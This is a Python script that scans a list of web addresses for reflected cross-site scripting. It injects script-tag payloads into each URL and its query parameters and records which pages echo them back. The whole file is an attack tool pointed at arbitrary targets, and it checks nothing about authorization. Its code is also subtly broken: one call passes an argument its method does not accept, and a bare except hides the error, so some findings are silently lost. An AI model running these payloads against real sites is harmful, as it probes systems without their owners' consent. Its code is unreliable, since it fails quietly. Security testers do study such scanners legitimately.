#!/usr/bin/env python

import requests

urls = [
]

attackPatterns = [
    '"><script>alert(\'XSS\');</script>',
    '--><script>alert(\'XSS\');</script><!--',

]


class Url:

    def parseParameters(self, url):
        url = url[url.find('?') + 1:]

        params = {}

        for p in url.split('&'):
            params[p.split('=')[0]] = p.split('=')[1]

        return params

    def __init__(self, url):
        if 'https://' in url:
            url = url[8:]
            self.protocoll = 'https://'
        elif 'http://' in url:
            url = url[7:]
            self.protocoll = 'http://'
        else:
            try:
                requests.get('https://' + url)
                self.protocoll = 'https://'
            except requests.RequestException:
                try:
                    requests.get('http://' + url)
                    self.protocoll = 'http://'
                except requests.RequestException:
                    self.protocoll = ''

        if '/' in url:
            self.domain = url[:url.find('/')]
            if '?' in url:
                self.path = url[url.find('/'):url.find('?')]
            else:
                self.path = url[url.find('/'):]
        else:
            self.domain = url
            self.path = ''

        self.parameters = self.parseParameters(url)

    def getParameterString(self):
        buf = ''
        for (key, value) in self.parameters.items():
            buf += key + '=' + value + '&'

        return buf

    def getUrl(self):
        return self.protocoll + self.domain + self.path + '?' + self.getParameterString()

    def setParamters(self, p):
        for (key, value) in p.items():
            self.parameters[key] = value


class Result:
    def __init__(self, url):
        self.url = url
        self.successfullPatterns = []

    def addSuccessPatterns(self, pattern):
        self.successfullPatterns.append(pattern)

    def getSuccessPatterns(self):
        return self.successfullPatterns

    def getUrl(self):
        return self.url


def attack(url):
    res = Result(url.domain + url.path)
    print(url.getUrl())

    for ap in attackPatterns:
        # attack plain get url

        r = requests.get(url.getUrl() + ap)
        if ap in r.text:
            res.addSuccessPatterns(url.getUrl() + ap, timeout=10)

        # attack get parameters
        injectedParameters = {}

        for key, _ in url.parameters.items():
            injectedParameters[key] = ap
        url.setParamters(injectedParameters)

        r = requests.get(url.getUrl(), timeout=10)

        if ap in r.text:
            res.addSuccessPatterns(url.getUrl())

    return res


def main():
    res = []

    with open('urls.txt', 'r', encoding="utf-8", errors="surrogateescape") as infile:
        urls = [u.rstrip() for u in infile.readlines()]

    for url in urls:
        try:
            res.append(attack(Url(url)))
        except KeyboardInterrupt:
            if input("quit?").lower() == 'y':
                break
            else:
                continue
        except:
            pass

    buf = ''
    for r in res:
        if r.getSuccessPatterns() != []:
            buf += r.getUrl()
            buf += "Patterns:\n"
            for p in r.getSuccessPatterns():
                buf += '+\t' + p + '\n'

            buf += '--------------------------------------\n'

    with open('found.txt', 'a') as f:
        f.write(buf)


if __name__ == '__main__':
    main()
